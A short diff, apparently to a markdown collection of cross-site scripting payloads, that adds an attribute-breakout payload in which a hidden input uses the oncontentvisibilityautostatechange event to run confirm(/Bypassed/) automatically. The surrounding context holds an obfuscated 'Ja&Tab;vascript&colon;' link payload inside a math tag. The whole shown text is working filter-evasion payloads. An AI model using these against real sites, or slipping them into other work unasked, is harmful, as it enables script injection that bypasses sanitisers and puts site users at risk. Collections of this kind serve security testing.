@@ -448,6 +448,8 @@ No click
 Click
 
 <math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>
+
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
 ````
 # Cookie Bomb
 ````
